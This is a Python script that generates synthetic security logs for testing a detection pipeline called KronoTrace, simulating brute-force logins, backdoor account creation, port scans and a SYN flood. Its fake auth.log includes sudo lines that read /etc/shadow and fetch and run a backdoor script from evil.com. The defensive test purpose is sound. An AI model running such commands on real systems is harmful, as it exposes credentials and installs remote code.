"""Generate realistic sample log files for testing the KronoTrace pipeline."""
import csv
import random
import os
from datetime import datetime, timedelta, timezone

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sample_data')
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ─── Sample CSV: Security Events with a Brute Force Attack ───────────────────

def generate_security_csv():
    """Generate a CSV with auth events including a brute force attack pattern."""
    filepath = os.path.join(OUTPUT_DIR, 'security_events.csv')
    base_time = datetime(2026, 4, 10, 8, 0, 0, tzinfo=timezone.utc)

    users = ['admin', 'jsmith', 'root', 'svc_backup', 'dba_user']
    attacker_ip = '185.220.101.42'
    normal_ips = ['10.0.1.50', '10.0.1.51', '10.0.2.100', '192.168.1.10', '10.0.3.25']
    workstations = ['WS-FINANCE-01', 'SRV-DC-01', 'WS-HR-02', 'SRV-DB-01', 'WS-IT-03']

    rows = []

    # Normal activity (first hour)
    for i in range(40):
        t = base_time + timedelta(minutes=random.randint(0, 60), seconds=random.randint(0, 59))
        ip = random.choice(normal_ips)
        user = random.choice(users)
        rows.append({
            'timestamp': t.isoformat(),
            'event_id': random.choice(['4624', '4624', '4634', '4688', '4689']),
            'severity': 'info',
            'category': 'authentication',
            'source_ip': ip,
            'username': user,
            'message': f'Successful logon from {ip} for user {user}',
            'hostname': random.choice(workstations),
        })

    # Brute force attack: 15 failed logins in 2 minutes from attacker IP
    attack_start = base_time + timedelta(hours=1, minutes=23)
    for i in range(15):
        t = attack_start + timedelta(seconds=random.randint(0, 120))
        rows.append({
            'timestamp': t.isoformat(),
            'event_id': '4625',
            'severity': 'high',
            'category': 'authentication',
            'source_ip': attacker_ip,
            'username': 'admin',
            'message': f'Failed logon attempt from {attacker_ip} for user admin (bad password)',
            'hostname': 'SRV-DC-01',
        })

    # Attacker succeeds after brute force
    success_time = attack_start + timedelta(minutes=3)
    rows.append({
        'timestamp': success_time.isoformat(),
        'event_id': '4624',
        'severity': 'info',
        'category': 'authentication',
        'source_ip': attacker_ip,
        'username': 'admin',
        'message': f'Successful logon from {attacker_ip} for user admin',
        'hostname': 'SRV-DC-01',
    })

    # Privilege escalation: attacker gets special privileges
    rows.append({
        'timestamp': (success_time + timedelta(seconds=5)).isoformat(),
        'event_id': '4672',
        'severity': 'medium',
        'category': 'authentication',
        'source_ip': attacker_ip,
        'username': 'admin',
        'message': f'Special privileges assigned to admin from {attacker_ip}',
        'hostname': 'SRV-DC-01',
    })

    # Post-compromise: attacker creates a backdoor account
    rows.append({
        'timestamp': (success_time + timedelta(minutes=2)).isoformat(),
        'event_id': '4720',
        'severity': 'high',
        'category': 'system',
        'source_ip': attacker_ip,
        'username': 'admin',
        'message': f'New user account "svc_update" created by admin from {attacker_ip}',
        'hostname': 'SRV-DC-01',
    })

    # Attacker adds backdoor to admin group
    rows.append({
        'timestamp': (success_time + timedelta(minutes=2, seconds=30)).isoformat(),
        'event_id': '4732',
        'severity': 'high',
        'category': 'system',
        'source_ip': attacker_ip,
        'username': 'admin',
        'message': 'User "svc_update" added to Administrators group',
        'hostname': 'SRV-DC-01',
    })

    # Attacker password reset
    rows.append({
        'timestamp': (success_time + timedelta(minutes=3)).isoformat(),
        'event_id': '4724',
        'severity': 'high',
        'category': 'authentication',
        'source_ip': attacker_ip,
        'username': 'admin',
        'message': 'Password reset for account "svc_update"',
        'hostname': 'SRV-DC-01',
    })

    # Bulk file access (data harvesting)
    harvest_time = success_time + timedelta(minutes=5)
    for i in range(20):
        t = harvest_time + timedelta(seconds=i * 3)
        rows.append({
            'timestamp': t.isoformat(),
            'event_id': '4663',
            'severity': 'info',
            'category': 'file_access',
            'source_ip': attacker_ip,
            'username': 'admin',
            'message': f'Object access: C:\\Confidential\\financial_report_{i+1}.xlsx',
            'hostname': 'SRV-DC-01',
        })

    # More normal activity after
    for i in range(20):
        t = base_time + timedelta(hours=2, minutes=random.randint(0, 60))
        ip = random.choice(normal_ips)
        user = random.choice(users[1:])
        rows.append({
            'timestamp': t.isoformat(),
            'event_id': random.choice(['4624', '4634', '4688']),
            'severity': 'info',
            'category': 'authentication',
            'source_ip': ip,
            'username': user,
            'message': f'Normal activity from {ip} for {user}',
            'hostname': random.choice(workstations),
        })

    # Sort by time
    rows.sort(key=lambda r: r['timestamp'])

    with open(filepath, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=[
            'timestamp', 'event_id', 'severity', 'category',
            'source_ip', 'username', 'message', 'hostname'
        ])
        writer.writeheader()
        writer.writerows(rows)

    print(f"[+] Generated {filepath} ({len(rows)} events)")
    return filepath


# ─── Sample Syslog: auth.log with SSH brute force ────────────────────────────

def generate_auth_log():
    """Generate an auth.log file with SSH brute force and privilege escalation."""
    filepath = os.path.join(OUTPUT_DIR, 'auth.log')
    base_time = datetime(2026, 4, 10, 8, 0, 0)
    attacker_ip = '185.220.101.42'
    normal_ips = ['10.0.1.50', '10.0.2.100']

    lines = []

    # Normal SSH activity
    for i in range(15):
        t = base_time + timedelta(minutes=random.randint(0, 50))
        ip = random.choice(normal_ips)
        ts = t.strftime('%b %d %H:%M:%S')
        user = random.choice(['jsmith', 'deploy', 'monitor'])
        lines.append((t, f'{ts} web-srv-01 sshd[{random.randint(1000,9999)}]: Accepted publickey for {user} from {ip} port {random.randint(40000,60000)} ssh2'))

    # Normal PAM sessions
    for i in range(10):
        t = base_time + timedelta(minutes=random.randint(0, 50))
        ts = t.strftime('%b %d %H:%M:%S')
        user = random.choice(['jsmith', 'deploy'])
        lines.append((t, f'{ts} web-srv-01 sshd[{random.randint(1000,9999)}]: pam_unix(sshd:session): session opened for user {user}(uid=1001) by (uid=0)'))

    # SSH brute force attack
    attack_start = base_time + timedelta(hours=1, minutes=23)
    for i in range(20):
        t = attack_start + timedelta(seconds=random.randint(0, 90))
        ts = t.strftime('%b %d %H:%M:%S')
        target_user = random.choice(['root', 'admin', 'ubuntu', 'test'])
        lines.append((t, f'{ts} web-srv-01 sshd[{random.randint(1000,9999)}]: Failed password for invalid user {target_user} from {attacker_ip} port {random.randint(40000,60000)} ssh2'))

    # Attacker eventually gets in
    success_time = attack_start + timedelta(minutes=4)
    ts = success_time.strftime('%b %d %H:%M:%S')
    pid = random.randint(1000, 9999)
    lines.append((success_time, f'{ts} web-srv-01 sshd[{pid}]: Accepted password for root from {attacker_ip} port 55123 ssh2'))
    lines.append((success_time + timedelta(seconds=1), f'{(success_time + timedelta(seconds=1)).strftime("%b %d %H:%M:%S")} web-srv-01 sshd[{pid}]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)'))

    # Attacker runs sudo commands
    sudo_time = success_time + timedelta(minutes=1)
    lines.append((sudo_time, f'{sudo_time.strftime("%b %d %H:%M:%S")} web-srv-01 sudo[{random.randint(1000,9999)}]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow'))
    lines.append((sudo_time + timedelta(seconds=10), f'{(sudo_time + timedelta(seconds=10)).strftime("%b %d %H:%M:%S")} web-srv-01 sudo[{random.randint(1000,9999)}]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/backdoor.sh'))
    lines.append((sudo_time + timedelta(seconds=20), f'{(sudo_time + timedelta(seconds=20)).strftime("%b %d %H:%M:%S")} web-srv-01 sudo[{random.randint(1000,9999)}]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/backdoor.sh'))

    # Systemd events
    for i in range(5):
        t = base_time + timedelta(hours=random.randint(0, 2), minutes=random.randint(0, 59))
        ts = t.strftime('%b %d %H:%M:%S')
        service = random.choice(['nginx', 'mysql', 'redis', 'cron'])
        action = random.choice(['Started', 'Stopped'])
        lines.append((t, f'{ts} web-srv-01 systemd[1]: {action} {service}.service'))

    # Sort and write
    lines.sort(key=lambda x: x[0])

    with open(filepath, 'w', encoding='utf-8') as f:
        for _, line in lines:
            f.write(line + '\n')

    print(f"[+] Generated {filepath} ({len(lines)} lines)")
    return filepath


def generate_firewall_log():
    """Generate a firewall log file simulating port scans and DoS floods."""
    filepath = os.path.join(OUTPUT_DIR, 'firewall.syslog')
    base_time = datetime(2026, 4, 10, 8, 0, 0)
    lines = []
    
    # Port Scan Activity
    scan_start = base_time + timedelta(hours=2)
    src_ip = "192.168.1.100"
    ports_to_probe = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 1433, 1521, 3306, 3389, 5432, 8080, 8443]
    for i, dpt in enumerate(ports_to_probe):
        t = scan_start + timedelta(seconds=i * random.uniform(0.1, 1.5))
        ts_str = t.strftime('%b %d %H:%M:%S')
        lines.append((t, f"{ts_str} HYPERION-FW1 network[8822]: SRC={src_ip} DST=10.0.0.50 SPT={random.randint(10000, 60000)} DPT={dpt} PROTO=TCP ACTION=DROP MSG=Port scan signature detected"))

    # Volumetric DoS Flood
    dos_start = base_time + timedelta(hours=3)
    dos_src = "203.0.113.88"
    for i in range(600):
        t = dos_start + timedelta(milliseconds=i * random.uniform(1, 15))
        ts_str = t.strftime('%b %d %H:%M:%S')
        lines.append((t, f"{ts_str} HYPERION-FW1 network[9911]: SRC={dos_src} DST=10.0.0.10 SPT={random.randint(10000, 60000)} DPT=80 PROTO=TCP ACTION=ALLOW MSG=Connection SYN arrived"))

    lines.sort(key=lambda x: x[0])
    with open(filepath, 'w', encoding='utf-8') as f:
        for _, line in lines:
            f.write(line + '\n')
            
    print(f"[+] Generated {filepath} ({len(lines)} lines)")
    return filepath

# ─── Generate All ─────────────────────────────────────────────────────────────

if __name__ == '__main__':
    print("Generating sample test data for KronoTrace...\n")
    csv_path = generate_security_csv()
    log_path = generate_auth_log()
    fw_path = generate_firewall_log()
    print(f"\n✅ Sample data ready in {OUTPUT_DIR}/")
    print(f"   - {os.path.basename(csv_path)} (Security events CSV with brute force + privilege escalation)")
    print(f"   - {os.path.basename(log_path)} (auth.log with SSH attack)")
    print(f"   - {os.path.basename(fw_path)} (firewall syslog with Port Scan and DoS flood)")
    print(f"\nUpload all files to KronoTrace to see the full pipeline in action!")
